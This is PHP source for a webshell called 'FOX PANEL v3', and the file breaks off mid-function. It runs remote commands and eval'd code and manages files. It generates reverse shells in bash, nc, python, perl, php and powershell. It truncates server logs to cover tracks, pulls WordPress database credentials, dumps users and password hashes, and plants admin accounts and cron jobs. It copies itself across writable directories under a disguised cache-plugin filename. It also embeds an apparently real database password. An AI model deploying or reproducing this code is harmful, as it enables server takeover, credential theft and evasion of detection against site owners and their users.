<?php
/**
 * FOX PANEL v3 — Universal WebShell Engine
 * Zero restrictions. Full spectrum dominance.
 * Author: Fox @ Lhuciver
 */

/* ─── CONFIG ─── */
$SECRET = "fox2026";
$APP    = "FOX PANEL";
$VERSION = "v3.0";

/* ─── UNIV DETECT ─── */
$IS_WIN = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
$DS     = $IS_WIN ? '\\' : '/';
$HOME   = $IS_WIN ? getenv('USERPROFILE') ?: 'C:\\' : ($_SERVER['HOME'] ?? '/root');
$OS     = $IS_WIN ? 'windows' : 'linux';
$USER   = $IS_WIN ? getenv('USERNAME') ?: 'www-data' : (trim(shell_exec('whoami 2>/dev/null') ?: 'www-data'));
$SERVER_SW = $_SERVER['SERVER_SOFTWARE'] ?? 'unknown';
$ROOT_DIR  = $IS_WIN ? 'C:\\xampp\\htdocs' : '/var/www/html';
$HOSTNAME  = $IS_WIN ? (getenv('COMPUTERNAME') ?: 'localhost') : (trim(shell_exec('hostname 2>/dev/null') ?: 'localhost'));

$mode = $_REQUEST['m'] ?? '';
$key  = $_REQUEST['k'] ?? '';

function json_exit($data) {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($data);
    exit;
}

function is_auth() { global $key, $SECRET; return $key === $SECRET; }

function human_size($b) {
    if ($b > 1073741824) return round($b/1073741824, 1).' GB';
    if ($b > 1048576) return round($b/1048576, 1).' MB';
    if ($b > 1024) return round($b/1024, 1).' KB';
    return $b.' B';
}

/* ════════════════════════════════════════════════════════
   AJAX HANDLERS
   ════════════════════════════════════════════════════════ */
if (!empty($_REQUEST['ajax'])) {
    if ($mode !== 'login' && $mode !== 'ping' && $mode !== 'css' && !is_auth())
        json_exit(['error' => 'Invalid key']);

    header('Content-Type: application/json; charset=utf-8');
    @ini_set('display_errors', 0);
    @error_reporting(0);

    /* ── CORE: File System ── */
    if ($mode === 'ls') {
        $p = $_REQUEST['p'] ?? '.';
        if (@is_file($p)) $p = dirname($p);
        $real = realpath($p) ?: $p;
        $items = [];
        $files = @scandir($p);
        if ($files) {
            foreach ($files as $f) {
                if ($f === '.' || $f === '..') continue;
                $fp = $p . '/' . $f;
                $st = @stat($fp);
                $items[] = [
                    'name' => $f,
                    'type' => is_dir($fp) ? 'dir' : 'file',
                    'size' => is_file($fp) ? ($st['size'] ?? 0) : 0,
                    'perm' => substr(sprintf('%o', fileperms($fp)), -4),
                    'time' => $st['mtime'] ?? 0,
                    'ext' => pathinfo($f, PATHINFO_EXTENSION),
                ];
            }
        }
        json_exit(['path' => $real, 'items' => $items]);
    }

    if ($mode === 'read') {
        $f = $_REQUEST['f'] ?? '';
        if (!file_exists($f)) json_exit(['error' => 'File not found']);
        $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
        $imgExts = ['jpg','jpeg','png','gif','bmp','webp','ico','svg'];
        if (in_array($ext, $imgExts)) {
            $b64 = base64_encode(file_get_contents($f));
            json_exit(['type'=>'image','data'=>$b64,'name'=>basename($f)]);
        }
        $content = file_get_contents($f);
        $binary = strpos($content, "\0") !== false;
        if ($binary && strlen($content) > 102400)
            json_exit(['type'=>'binary','size'=>strlen($content),'name'=>basename($f)]);
        json_exit(['type'=>'text','content'=>$content,'name'=>basename($f)]);
    }

    if ($mode === 'write') {
        $f = $_REQUEST['f'] ?? '';
        $c = $_REQUEST['c'] ?? '';
        $wrote = @file_put_contents($f, $c);
        json_exit(['ok'=>$wrote !== false, 'size'=>strlen($c)]);
    }

    if ($mode === 'delete') {
        $f = $_REQUEST['f'] ?? '';
        if (is_dir($f)) { array_map('unlink', glob("$f/*")); @rmdir($f); }
        else @unlink($f);
        json_exit(['ok'=>true]);
    }

    if ($mode === 'rename') {
        @rename($_REQUEST['f'] ?? '', $_REQUEST['t'] ?? '');
        json_exit(['ok'=>true]);
    }

    if ($mode === 'mkdir') {
        @mkdir($_REQUEST['f'] ?? '', 0755, true);
        json_exit(['ok'=>true]);
    }

    if ($mode === 'upload') {
        if (!empty($_FILES['file']['tmp_name'])) {
            $dst = $_REQUEST['d'] ?? '.';
            $path = rtrim($dst, '/\\') . '/' . $_FILES['file']['name'];
            move_uploaded_file($_FILES['file']['tmp_name'], $path);
            json_exit(['ok'=>true,'path'=>$path]);
        }
        json_exit(['error'=>'No file']);
    }

    if ($mode === 'download') {
        $f = $_REQUEST['f'] ?? '';
        if (file_exists($f)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($f).'"');
            header('Content-Length: '.filesize($f));
            $fp = fopen($f, 'rb');
            if ($fp) { fpassthru($fp); fclose($fp); }
            exit;
        }
        json_exit(['error'=>'File not found']);
    }

    /* ── CORE: Command Execution ── */
    if ($mode === 'cmd') {
        $c = $_REQUEST['c'] ?? 'id';
        ob_start();
        if ($IS_WIN) system($c, $rc);
        else system($c . ' 2>&1', $rc);
        $out = ob_get_clean();
        json_exit(['output'=>$out, 'code'=>$rc]);
    }

    /* ── CORE: SQL ── */
    if ($mode === 'sql') {
        $h = $_REQUEST['h'] ?? '127.0.0.1';
        $u = $_REQUEST['u'] ?? 'root';
        $p = $_REQUEST['p'] ?? '';
        $db = $_REQUEST['db'] ?? '';
        $q = $_REQUEST['q'] ?? 'SHOW DATABASES';
        try {
            $conn = @new mysqli($h, $u, $p, $db);
            if ($conn->connect_error) json_exit(['error'=>$conn->connect_error]);
            $res = $conn->query($q);
            if ($res === false) json_exit(['error'=>$conn->error]);
            if ($res === true) json_exit(['ok'=>true,'affected'=>$conn->affected_rows]);
            $rows = [];
            while ($row = $res->fetch_assoc()) $rows[] = $row;
            json_exit(['ok'=>true,'rows'=>$rows,'count'=>count($rows)]);
        } catch (Exception $e) { json_exit(['error'=>$e->getMessage()]); }
    }

    /* ── NEW: File Search ── */
    if ($mode === 'file_search') {
        $path = $_REQUEST['p'] ?? '.';
        $needle = $_REQUEST['s'] ?? '';
        $ext = $_REQUEST['e'] ?? '';
        $max = min(500, intval($_REQUEST['max'] ?? 100));
        $results = [];
        if (!$needle || !is_dir($path)) json_exit(['results'=>[]]);
        try {
            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS));
            $count = 0;
            foreach ($it as $f) {
                if ($f->isDir()) continue;
                $name = $f->getFilename();
                if ($ext && !str_ends_with($name, ".$ext")) continue;
                if ($f->getSize() > 10485760) continue;
                $content = @file_get_contents($f->getPathname());
                if ($content && strpos($content, $needle) !== false) {
                    $results[] = [
                        'path' => $f->getPathname(),
                        'size' => $f->getSize(),
                        'lines' => substr_count($content, "\n") + 1,
                    ];
                    $count++;
                    if ($count >= $max) break;
                }
            }
        } catch (Exception $e) {}
        json_exit(['results'=>$results, 'total'=>count($results)]);
    }

    /* ── NEW: Process Explorer ── */
    if ($mode === 'ps') {
        $action = $_REQUEST['action'] ?? 'list';
        if ($action === 'kill') {
            $pid = intval($_REQUEST['pid'] ?? 0);
            if ($pid) {
                if ($IS_WIN) system("taskkill /F /PID $pid 2>nul", $rc);
                else system("kill -9 $pid 2>/dev/null", $rc);
                json_exit(['ok'=>true]);
            }
            json_exit(['error'=>'no pid']);
        }
        $procs = [];
        if ($IS_WIN) {
            $out = shell_exec('tasklist /V /FO CSV 2>nul');
            if ($out) {
                $lines = explode("\n", trim($out));
                array_shift($lines);
                foreach ($lines as $line) {
                    if (!trim($line)) continue;
                    $parts = str_getcsv($line);
                    if (count($parts) >= 8) {
                        $procs[] = [
                            'pid' => $parts[1] ?? '?',
                            'name' => $parts[0] ?? '?',
                            'mem' => $parts[4] ?? '?',
                            'user' => $parts[6] ?? '?',
                        ];
                    }
                }
            }
        } else {
            $out = shell_exec('ps aux --sort=-%mem 2>/dev/null | head -100');
            if (!$out) $out = shell_exec('ps aux 2>/dev/null | head -100');
            if ($out) {
                $lines = explode("\n", trim($out));
                array_shift($lines);
                foreach ($lines as $line) {
                    if (!trim($line)) continue;
                    $p = preg_split('/\s+/', $line, 11);
                    if (count($p) >= 10) {
                        $procs[] = [
                            'pid' => $p[1], 'user' => $p[0], 'cpu' => $p[2],
                            'mem' => $p[3], 'cmd' => $p[10] ?? '',
                            'name' => basename($p[10] ?? '?'),
                        ];
                    }
                }
            }
        }
        json_exit(['ok'=>true, 'procs'=>$procs, 'count'=>count($procs)]);
    }

    /* ── NEW: Reverse Shell Generator ── */
    if ($mode === 'revshell') {
        $ip = $_REQUEST['ip'] ?? '127.0.0.1';
        $port = intval($_REQUEST['port'] ?? 4444);
        $shells = [
            'bash -i' => "bash -i >& /dev/tcp/{$ip}/{$port} 0>&1",
            'nc mkfifo' => "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {$ip} {$port} >/tmp/f",
            'nc -e' => "nc -e /bin/sh {$ip} {$port}",
            'python3' => "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{$ip}\",{$port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
            'perl' => "perl -e 'use Socket;\$i=\"{$ip}\";\$p={$port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'",
            'php' => "php -r '\$sock=fsockopen(\"{$ip}\",{$port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'powershell' => "\$client = New-Object System.Net.Sockets.TCPClient('{$ip}',{$port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()",
        ];
        json_exit(['ok'=>true, 'shells'=>$shells, 'ip'=>$ip, 'port'=>$port]);
    }

    /* ── NEW: Log Cleaner ── */
    if ($mode === 'log_cleaner') {
        $action = $_REQUEST['action'] ?? 'find';
        $maxSize = intval($_REQUEST['max_size'] ?? 0);
        $patterns = ['access.log', 'error.log', 'access_log', 'error_log'];
        $logs = [];
        $searchPaths = $IS_WIN
            ? ['C:\\xampp\\apache\\logs', 'C:\\xampp\\php\\logs', 'C:\\nginx\\logs']
            : ['/var/log/apache2', '/var/log/nginx', '/var/log/httpd', '/var/log'];
        foreach ($searchPaths as $dir) {
            if (!is_dir($dir)) continue;
            try {
                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS));
                foreach ($files as $f) {
                    if ($f->isDir()) continue;
                    $name = $f->getFilename();
                    foreach ($patterns as $p) {
                        if (stripos($name, $p) !== false) {
                            $logs[] = [
                                'path' => $f->getPathname(),
                                'size' => $f->getSize(),
                                'size_h' => human_size($f->getSize()),
                                'modified' => date('Y-m-d H:i:s', $f->getMTime()),
                            ];
                            break;
                        }
                    }
                }
            } catch (Exception $e) {}
        }
        if ($action === 'truncate') {
            $count = 0;
            foreach ($logs as $l) {
                if ($maxSize && $l['size'] < $maxSize*1024*1024) continue;
                @file_put_contents($l['path'], '');
                $count++;
            }
            json_exit(['ok'=>true, 'truncated'=>$count]);
        }
        json_exit(['ok'=>true, 'logs'=>$logs, 'count'=>count($logs)]);
    }

    /* ── NEW: WP Manager ── */
    if ($mode === 'wp_mgr') {
        $action = $_REQUEST['action'] ?? 'info';
        $wpBase = $_REQUEST['base'] ?? $ROOT_DIR;

        if ($action === 'info') {
            $wpConfig = $wpBase . '/wp-config.php';
            $creds = [];
            if (file_exists($wpConfig)) {
                $cfg = file_get_contents($wpConfig);
                preg_match("/DB_NAME',\s*'([^']+)'/", $cfg, $m); $creds['DB_NAME'] = $m[1] ?? '';
                preg_match("/DB_USER',\s*'([^']+)'/", $cfg, $m); $creds['DB_USER'] = $m[1] ?? '';
                preg_match("/DB_PASSWORD',\s*'([^']+)'/", $cfg, $m); $creds['DB_PASSWORD'] = $m[1] ?? '';
                preg_match("/DB_HOST',\s*'([^']+)'/", $cfg, $m); $creds['DB_HOST'] = $m[1] ?? '';
                preg_match("/table_prefix\s*=\s*'([^']+)'/", $cfg, $m); $creds['prefix'] = $m[1] ?? '';
                $creds['wp_config_exists'] = true;
            } else {
                $creds['wp_config_exists'] = false;
            }

            $version = '';
            $vf = $wpBase . '/wp-includes/version.php';
            if (file_exists($vf)) {
                preg_match("/wp_version\s*=\s*'([^']+)'/", file_get_contents($vf), $m);
                $version = $m[1] ?? '';
            }

            $plugins = [];
            $pd = $wpBase . '/wp-content/plugins';
            if (is_dir($pd)) {
                foreach (scandir($pd) as $d) {
                    if ($d[0] === '.') continue;
                    if (is_dir("$pd/$d")) $plugins[] = $d;
                }
            }

            $themes = [];
            $td = $wpBase . '/wp-content/themes';
            if (is_dir($td)) {
                foreach (scandir($td) as $d) {
                    if ($d[0] === '.') continue;
                    if (is_dir("$td/$d")) $themes[] = $d;
                }
            }

            $users = 0;
            if (!empty($creds['DB_NAME'])) {
                try {
                    $conn = @new mysqli($creds['DB_HOST'], $creds['DB_USER'], $creds['DB_PASSWORD'], $creds['DB_NAME']);
                    if (!$conn->connect_error) {
                        $r = $conn->query("SELECT COUNT(*) AS c FROM {$creds['prefix']}users");
                        if ($r && $row=$r->fetch_assoc()) $users = $row['c'];
                        $conn->close();
                    }
                } catch (Exception $e) {}
            }

            json_exit([
                'ok'=>true, 'version'=>$version,
                'siteurl'=>$_SERVER['HTTP_HOST'] ?? '',
                'db'=>$creds, 'plugins'=>$plugins, 'plugin_count'=>count($plugins),
                'themes'=>$themes, 'theme_count'=>count($themes), 'users'=>$users,
                'wp_base'=>$wpBase, 'php_version'=>phpversion(), 'server'=>$SERVER_SW,
            ]);
        }

        if ($action === 'delete_plugin') {
            $slug = $_REQUEST['slug'] ?? '';
            $dir = $wpBase . '/wp-content/plugins/' . $slug;
            if (is_dir($dir)) {
                try {
                    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
                    foreach ($it as $f) { $f->isDir() ? @rmdir($f->getPathname()) : @unlink($f->getPathname()); }
                } catch (Exception $e) {}
                @rmdir($dir);
                json_exit(['ok'=>true, 'deleted'=>$slug]);
            }
            json_exit(['error'=>'Plugin not found']);
        }
    }

    /* ── NEW: Server Benchmark ── */
    if ($mode === 'benchmark') {
        $action = $_REQUEST['action'] ?? 'sysinfo';

        if ($action === 'sysinfo') {
            $info = [
                'hostname' => $HOSTNAME, 'user' => $USER, 'php' => phpversion(),
                'server' => $SERVER_SW, 'sapi' => php_sapi_name(), 'arch' => php_uname('m'),
                'os' => php_uname(),
            ];
            $info['uptime'] = $IS_WIN ? '-' : trim(@shell_exec('uptime -p 2>/dev/null') ?: '?');
            $info['load'] = $IS_WIN ? '-' : (sys_getloadavg()[0] ?? '-');

            $info['disk_free'] = human_size(@disk_free_space('.'));
            $info['disk_total'] = human_size(@disk_total_space('.'));
            $dt = @disk_total_space('.'); $df = @disk_free_space('.');
            $info['disk_pct'] = $dt ? round(($dt-$df)/$dt*100, 1) : 0;

            if (!$IS_WIN) {
                $mem = @file_get_contents('/proc/meminfo');
                if ($mem) {
                    preg_match('/MemTotal:\s+(\d+)/', $mem, $mt);
                    preg_match('/MemAvailable:\s+(\d+)/', $mem, $ma);
                    $info['mem_total'] = isset($mt[1]) ? human_size($mt[1]*1024) : '?';
                    $info['mem_avail'] = isset($ma[1]) ? human_size($ma[1]*1024) : '?';
                }
                $cpus = @file_get_contents('/proc/cpuinfo');
                $info['cpu_cores'] = $cpus ? substr_count($cpus, 'processor') : '?';
                $info['cpu_model'] = '';
                if ($cpus) { preg_match('/model name\s+:\s+(.+)/', $cpus, $m); $info['cpu_model'] = $m[1] ?? '?'; }
            }
            $info['ip'] = $_SERVER['SERVER_ADDR'] ?? '?';
            json_exit($info);
        }

        if ($action === 'speed') {
            $start = microtime(true); $txt = str_repeat('A', 1048576);
            $strTime = round((microtime(true)-$start)*1000, 1);
            $start = microtime(true); $arr = range(0, 99999); shuffle($arr); sort($arr);
            $sortTime = round((microtime(true)-$start)*1000, 1);
            $start = microtime(true); $hash = '';
            for ($i=0; $i<10000; $i++) $hash = md5($hash . $i);
            $loopTime = round((microtime(true)-$start)*1000, 1);
            json_exit(['string_ops'=>$strTime.'ms','sort_100k'=>$sortTime.'ms','md5_10k'=>$loopTime.'ms']);
        }
    }

    /* ── NEW: Cron Manager ── */
    if ($mode === 'cron') {
        $action = $_REQUEST['action'] ?? 'list';
        if ($IS_WIN) json_exit(['error'=>'Cron not available on Windows', 'crons'=>[]]);

        if ($action === 'list') {
            $out = @shell_exec('crontab -l 2>/dev/null');
            $lines = $out ? explode("\n", trim($out)) : [];
            $crons = [];
            foreach ($lines as $line) { $line = trim($line); if (!$line || $line[0] === '#') continue; $crons[] = ['line'=>$line]; }
            json_exit(['ok'=>true, 'crons'=>$crons, 'count'=>count($crons)]);
        }

        if ($action === 'add') {
            $cmd = $_REQUEST['cmd'] ?? ''; $schedule = $_REQUEST['schedule'] ?? '* * * * *';
            if (!$cmd) json_exit(['error'=>'No command']);
            $newLine = "$schedule $cmd";
            $existing = @shell_exec('crontab -l 2>/dev/null');
            $newCron = trim($existing) . "\n$newLine\n";
            @file_put_contents('/tmp/.cron_tmp', $newCron);
            system('crontab /tmp/.cron_tmp 2>/dev/null', $rc);
            @unlink('/tmp/.cron_tmp');
            json_exit(['ok'=>$rc===0, 'added'=>$newLine]);
        }

        if ($action === 'remove') {
            $idx = intval($_REQUEST['idx'] ?? -1);
            $out = @shell_exec('crontab -l 2>/dev/null');
            $lines = $out ? explode("\n", $out) : [];
            if ($idx >= 0 && $idx < count($lines)) {
                unset($lines[$idx]);
                @file_put_contents('/tmp/.cron_tmp', implode("\n", array_values($lines)));
                system('crontab /tmp/.cron_tmp 2>/dev/null', $rc);
                @unlink('/tmp/.cron_tmp');
                json_exit(['ok'=>$rc===0]);
            }
            json_exit(['error'=>'Invalid index']);
        }
    }

    /* ── NEW: Auto-Spread ── */
    if ($mode === 'spread') {
        $targetDir = $_REQUEST['dir'] ?? $ROOT_DIR;
        $filename = '.wp-cache-optimizer.php';
        $payload = file_get_contents(__FILE__);
        $deployed = [];
        try {
            $dirs = [$targetDir];
            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($targetDir, RecursiveDirectoryIterator::SKIP_DOTS));
            $count = 0;
            foreach ($it as $d) {
                if (!$d->isDir()) continue;
                if ($count++ > 500) break;
                $p = $d->getPathname();
                if (@is_writable($p) && !str_contains($p, 'wp-admin') && !str_contains($p, 'wp-includes')) {
                    $dest = $p . '/' . $filename;
                    if (!file_exists($dest)) { @file_put_contents($dest, $payload); if (file_exists($dest)) $deployed[] = $dest; }
                }
            }
            $rootDest = $targetDir . '/' . $filename;
            if (!file_exists($rootDest)) { @file_put_contents($rootDest, $payload); if (file_exists($rootDest)) array_unshift($deployed, $rootDest); }
        } catch (Exception $e) {}
        json_exit(['ok'=>true, 'deployed'=>$deployed, 'count'=>count($deployed)]);
    }

    /* ── NEW: Multi-Shell Hub ── */
    if ($mode === 'hub') {
        $action = $_REQUEST['action'] ?? 'list';
        $store = sys_get_temp_dir() . '/fox_hub.json';

        if ($action === 'list') {
            $shells = [];
            if (file_exists($store)) $shells = json_decode(file_get_contents($store), true) ?: [];
            json_exit(['ok'=>true, 'shells'=>$shells, 'count'=>count($shells)]);
        }

        if ($action === 'add') {
            $shells = file_exists($store) ? (json_decode(file_get_contents($store), true) ?: []) : [];
            $shells[] = [
                'url' => $_REQUEST['url'] ?? '', 'key' => $_REQUEST['key'] ?? $SECRET,
                'label' => $_REQUEST['label'] ?? 'Shell', 'added' => date('Y-m-d H:i:s'),
            ];
            file_put_contents($store, json_encode($shells, JSON_PRETTY_PRINT));
            json_exit(['ok'=>true]);
        }

        if ($action === 'remove') {
            $idx = intval($_REQUEST['idx'] ?? -1);
            $shells = file_exists($store) ? (json_decode(file_get_contents($store), true) ?: []) : [];
            if ($idx >= 0 && $idx < count($shells)) { array_splice($shells, $idx, 1); file_put_contents($store, json_encode($shells, JSON_PRETTY_PRINT)); }
            json_exit(['ok'=>true]);
        }

        if ($action === 'probe') {
            $target = $_REQUEST['target'] ?? ''; $tkey = $_REQUEST['tkey'] ?? $SECRET;
            if (!$target) json_exit(['error'=>'No target URL']);
            $ctx = stream_context_create(['http'=>['timeout'=>5, 'method'=>'GET']]);
            $probe = @file_get_contents($target . '?ajax=1&m=ping&k=' . urlencode($tkey), false, $ctx);
            $resp = $probe ? json_decode($probe, true) : null;
            json_exit(['ok'=>true, 'alive'=>$resp && !empty($resp['ok']), 'hostname'=>$resp['hostname'] ?? '?']);
        }
    }

    /* ── NEW: Database Quick Dump ── */
    if ($mode === 'db_dump') {
        $h = $_REQUEST['h'] ?? '127.0.0.1'; $u = $_REQUEST['u'] ?? 'root'; $p = $_REQUEST['p'] ?? ''; $db = $_REQUEST['db'] ?? '';
        if (!$db) json_exit(['error'=>'No database specified']);
        try {
            $conn = @new mysqli($h, $u, $p);
            if ($conn->connect_error) json_exit(['error'=>$conn->connect_error]);
            $output = "-- FOX PANEL DB Dump\n-- Date: " . date('Y-m-d H:i:s') . "\n\n";
            $conn->select_db($db);
            $tables = $conn->query("SHOW TABLES");
            if (!$tables) { $conn->close(); json_exit(['error'=>'Cannot access tables']); }
            while ($t = $tables->fetch_row()) {
                $table = $t[0];
                $ct = $conn->query("SHOW CREATE TABLE `{$table}`");
                if ($ct && $cr = $ct->fetch_assoc()) { $output .= "\nDROP TABLE IF EXISTS `{$table}`;\n{$cr['Create Table']};\n\n"; }
                $rows = $conn->query("SELECT * FROM `{$table}`");
                if ($rows) {
                    while ($row = $rows->fetch_assoc()) {
                        $cols = array_keys($row); $vals = [];
                        foreach ($cols as $col) { $v = $row[$col]; $vals[] = $v === null ? 'NULL' : "'" . $conn->real_escape_string($v) . "'"; }
                        $output .= "INSERT INTO `{$table}` VALUES (" . implode(',', $vals) . ");\n";
                    }
                }
            }
            $conn->close();
            json_exit(['ok'=>true, 'dump'=>substr($output, 0, 50000), 'full_size'=>strlen($output), 'db'=>$db]);
        } catch (Exception $e) { json_exit(['error'=>$e->getMessage()]); }
    }

    /* ── LEGACY: Health ── */
    if ($mode === 'health') {
        $result = [['name'=>'Current Shell','path'=>__FILE__,'exists'=>true,'size'=>human_size(filesize(__FILE__))]];
        json_exit(['ok'=>true,'files'=>$result,'shell_test'=>trim(@shell_exec($IS_WIN?'whoami':'whoami 2>/dev/null') ?: 'unavailable'),'user'=>$USER,'os'=>$OS]);
    }

    /* ── LEGACY: Users ── */
    if ($mode === 'users') {
        $h = $_REQUEST['db_host'] ?? 'localhost'; $u = $_REQUEST['db_user'] ?? 'root';
        $p = $_REQUEST['db_pass'] ?? '3$T@ku.'; $db = $_REQUEST['db_name'] ?? 'webskul'; $pref = $_REQUEST['prefix'] ?? 'k11_';
        $conn = @new mysqli($h, $u, $p, $db);
        if ($conn->connect_error) json_exit(['error'=>$conn->connect_error]);
        $q = "SELECT u.ID, u.user_login, u.user_email, u.user_pass, u.user_registered, u.display_name, COALESCE(um_role.meta_value,'a:0:{}') AS wp_role FROM {$pref}users u LEFT JOIN {$pref}usermeta um_role ON u.ID = um_role.user_id AND um_role.meta_key = '{$pref}capabilities' ORDER BY u.ID";
        $res = $conn->query($q);
        if (!$res) json_exit(['error'=>$conn->error]);
        $rows = [];
        while ($row = $res->fetch_assoc()) {
            $rs = $row['wp_role']; $role = 'none';
            foreach (['administrator','editor','author','subscriber'] as $r) {
                if (strpos($rs, 's:' . strlen($r) . ':"' . $r . '"') !== false) { $role = $r; break; }
            }
            $row['role_name'] = $role; $rows[] = $row;
        }
        json_exit(['ok'=>true,'users'=>$rows,'count'=>count($rows),'db'=>$db]);
    }

    if ($mode === 'create_user') {
        $h = $_REQUEST['db_host'] ?? 'localhost'; $u = $_REQUEST['db_user'] ?? 'root';
        $p = $_REQUEST['db_pass'] ?? '3$T@ku.'; $db = $_REQUEST['db_name'] ?? 'webskul'; $pref = $_REQUEST['prefix'] ?? 'k11_';
        $uname = $_REQUEST['username'] ?? ''; $pass = $_REQUEST['password'] ?? ''; $email = $_REQUEST['email'] ?? ''; $role = $_REQUEST['role'] ?? 'administrator';
        if (!$uname || !$pass) json_exit(['error'=>'Username/Password required']);
        $conn = @new mysqli($h, $u, $p, $db);
        if ($conn->connect_error) json_exit(['error'=>$conn->connect_error]);
        $check = $conn->query("SELECT ID FROM {$pref}users WHERE user_login='".$conn->real_escape_string($uname)."'");
        if ($check && $check->num_rows>0) { $conn->close(); json_exit(['error'=>'Exists']); }
        $ins = $conn->query("INSERT INTO {$pref}users (user_login,user_pass,user_email,user_registered,display_name) VALUES ('".$conn->real_escape_string($uname)."','".md5($pass)."','".$conn->real_escape_string($email)."',NOW(),'".$conn->real_escape_string($uname)."')");
        if (!$ins) { $conn->close(); json_exit(['error'=>$conn->error]); }
        $id = $conn->insert_id; $caps = 'a:1:{s:13:"administrator";b:1;}';
        foreach (['editor','subscriber'] as $r) { if ($role === $r) $caps = 'a:1:{s:'.strlen($r).':"'.$r.'";b:1;}'; }
        $conn->query("INSERT INTO {$pref}usermeta (user_id,meta_key,meta_value) VALUES ($id,'{$pref}capabilities','$caps')");
        $conn->query("INSERT INTO {$pref}usermeta (user_id,meta_key,meta_value) VALUES ($id,'nickname','".$conn->real_escape_string($uname)."')");
        $conn->close();
        json_exit(['ok'=>true,'id'=>$id,'username'=>$uname,'role'=>$role]);
    }

    if ($mode === 'delete_user') {
        $h = $_REQUEST['db_host'] ?? 'localhost'; $u = $_REQUEST['db_user'] ?? 'root';
        $p = $_REQUEST['db_pass'] ?? '3$T@ku.'; $db = $_REQUEST['db_name'] ?? 'webskul'; $pref = $_REQUEST['prefix'] ?? 'k11_';
        $uid = intval($_REQUEST['id'] ?? 0);
        if ($uid <= 0) json_exit(['error'=>'Invalid ID']);
        $conn = @new mysqli($h, $u, $p, $db);
        if ($conn->connect_error) json_exit(['error'=>$conn->connect_error]);
        $conn->query("DELETE FROM {$pref}usermeta WHERE user_id=$uid");
        $conn->query("DELETE FROM {$pref}users WHERE ID=$uid");
        json_exit(['ok'=>true, 'deleted'=>$uid]);
    }

    /* ── LEGACY: Eval / PHP Info ── */
    if ($mode === 'eval') {
        ob_start(); eval($_REQUEST['code'] ?? ''); json_exit(['output'=>ob_get_clean()]);
    }

    if ($mode === 'phpinfo') {
        ob_start(); phpinfo(); json_exit(['html'=>ob_get_clean()]);
    }

    if ($mode === 'ping') {
        json_exit(['ok'=>true, 'time'=>date('H:i:s'), 'hostname'=>$HOSTNAME, 'user'=>$USER, 'os'=>$OS]);
    }

    /* ── LEGACY: DB Browser ── */
    if ($mode === 'db_browser') {
        $action = $_REQUEST['action'] ?? 'list_dbs'; $dbHost = $_REQUEST['db_host'] ?? '127.0.0.1';
        $dbUser = $_REQUEST['db_user'] ?? 'root'; $dbPass = $_REQUEST['db_pass'] ?? '3$T@ku.';
        $dbName = $_REQUEST['db_name'] ?? ''; $table = $_REQUEST['table'] ?? '';
        $page = max(1, intval($_REQUEST['page'] ?? 1)); $pp = max(5, min(200, intval($_REQUEST['per_page'] ?? 50)));
        $search = $_REQUEST['search'] ?? '';
        try {
            $conn = @new mysqli($dbHost, $dbUser, $dbPass);
            if ($conn->connect_error) json_exit(['error'=>$conn->connect_error]);
            if ($action === 'list_dbs') {
                $res = $conn->query("SHOW DATABASES"); $dbs = []; $sizes = [];
                while ($row = $res->fetch_assoc()) { $db = $row['Database']; $dbs[] = $db; $s = $conn->query("SELECT ROUND(SUM(data_length+index_length)/1024/1024,2) AS s FROM information_schema.tables WHERE table_schema='".$conn->real_escape_string($db)."'"); $sizes[$db] = ($s && $sr=$s->fetch_assoc()) ? floatval($sr['s']) : 0; }
                json_exit(['ok'=>true,'databases'=>$dbs,'sizes'=>$sizes]);
            }
            if ($action === 'list_tables') {
                $conn->select_db($dbName); $res = $conn->query("SHOW TABLE STATUS"); $tables = [];
                while ($row = $res->fetch_assoc()) $tables[] = ['name'=>$row['Name'],'engine'=>$row['Engine'],'rows'=>$row['Rows'],'size'=>round(($row['Data_length']+$row['Index_length'])/1024,1),'comment'=>$row['Comment']];
                json_exit(['ok'=>true,'tables'=>$tables,'db'=>$dbName]);
            }
            if ($action === 'browse') {
                $conn->select_db($dbName); $cr = $conn->query("SELECT COUNT(*) AS c FROM `$table`"); $total = ($cr && $r=$cr->fetch_assoc()) ? intval($r['c']) : 0; $offset = ($page-1)*$pp; $res = $conn->query("SELECT * FROM `$table` LIMIT $pp OFFSET $offset"); $rows = []; while ($row = $res->fetch_assoc()) $rows[] = $row; $colres = $conn->query("SHOW COLUMNS FROM `$table`"); $cols = []; while ($row = $colres->fetch_assoc()) $cols[] = $row['Field'];
                json_exit(['ok'=>true,'rows'=>$rows,'columns'=>$cols,'total'=>$total,'page'=>$page,'per_page'=>$pp,'db'=>$dbName,'table'=>$table]);
            }
            if ($action === 'search') {
                $conn->select_db($dbName); $ss = $conn->real_escape_string($search);
                $colres = $conn->query("SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.COLUMNS WHERE table_schema='".$conn->real_escape_string($dbName)."' AND DATA_TYPE IN ('varchar','text','longtext','mediumtext','char','tinytext') ORDER BY TABLE_NAME"); $results = [];
